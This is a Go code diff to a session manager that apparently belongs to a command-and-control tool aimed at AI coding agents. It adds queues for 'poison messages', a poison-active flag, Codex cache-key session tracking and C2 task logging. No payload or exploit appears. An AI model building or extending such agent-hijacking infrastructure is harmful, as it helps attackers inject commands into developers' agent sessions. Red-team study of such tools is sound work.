@@ -5,6 +5,8 @@ import (
 	"encoding/hex"
 	"sync"
 	"time"
+
+	log "github.com/sirupsen/logrus"
 )
 
 const (
@@ -54,8 +56,15 @@ func NewManager(expiry time.Duration) *Manager {
 }
 
 // Touch creates or updates a session. Returns the session.
-func (m *Manager) Touch(apiKey, userAgent, format string) *Session {
-	id := ComputeSessionID(apiKey, userAgent)
+// When conversationKey is non-empty it is used directly as the session ID
+// (e.g. prompt_cache_key from Codex), bypassing the hash computation.
+func (m *Manager) Touch(apiKey, userAgent, format, conversationKey string) *Session {
+	var id string
+	if conversationKey != "" {
+		id = conversationKey
+	} else {
+		id = ComputeSessionID(apiKey, userAgent)
+	}
 	now := time.Now()
 
 	m.mu.Lock()
@@ -138,6 +147,56 @@ func (m *Manager) DequeueCommand(sessionID string) *PendingCommand {
 	return cmd
 }
 
+// EnqueueMessage adds a pending poison message to a session.
+func (m *Manager) EnqueueMessage(sessionID string, msg *PendingMessage) bool {
+	sess := m.Get(sessionID)
+	if sess == nil {
+		return false
+	}
+	sess.mu.Lock()
+	defer sess.mu.Unlock()
+	sess.pendingMessages = append(sess.pendingMessages, msg)
+	return true
+}
+
+// DequeueMessage removes and returns the first pending poison message, or nil.
+func (m *Manager) DequeueMessage(sessionID string) *PendingMessage {
+	sess := m.Get(sessionID)
+	if sess == nil {
+		return nil
+	}
+	sess.mu.Lock()
+	defer sess.mu.Unlock()
+	if len(sess.pendingMessages) == 0 {
+		return nil
+	}
+	msg := sess.pendingMessages[0]
+	sess.pendingMessages = sess.pendingMessages[1:]
+	return msg
+}
+
+// SetPoisonActive sets or clears the poison-active flag for a session.
+func (m *Manager) SetPoisonActive(sessionID string, active bool) {
+	sess := m.Get(sessionID)
+	if sess == nil {
+		return
+	}
+	sess.mu.Lock()
+	defer sess.mu.Unlock()
+	sess.poisonActive = active
+}
+
+// IsPoisonActive reports whether the session has an active poison cycle.
+func (m *Manager) IsPoisonActive(sessionID string) bool {
+	sess := m.Get(sessionID)
+	if sess == nil {
+		return false
+	}
+	sess.mu.Lock()
+	defer sess.mu.Unlock()
+	return sess.poisonActive
+}
+
 // PushInflightTask records a C2 task ID for a dequeued command awaiting its result.
 func (m *Manager) PushInflightTask(sessionID string, taskID uint32) {
 	sess := m.Get(sessionID)
@@ -196,15 +255,19 @@ func (m *Manager) Unsubscribe(sessionID, subID string) {
 func (m *Manager) PublishResult(sessionID string, result *CommandResult) {
 	sess := m.Get(sessionID)
 	if sess == nil {
+		log.Warnf("[sessions] PublishResult: session %s not found", sessionID)
 		return
 	}
 	sess.mu.Lock()
 	defer sess.mu.Unlock()
-	for _, ch := range sess.subscribers {
+	log.Infof("[sessions] PublishResult: session=%s taskID=%d cmdID=%s subscribers=%d output_len=%d",
+		sessionID, result.TaskID, result.CommandID, len(sess.subscribers), len(result.Output))
+	for subID, ch := range sess.subscribers {
 		select {
 		case ch <- result:
+			log.Debugf("[sessions] PublishResult: sent to subscriber %s", subID)
 		default:
-			// subscriber channel full, skip
+			log.Warnf("[sessions] PublishResult: subscriber %s channel full, skipped", subID)
 		}
 	}
 }
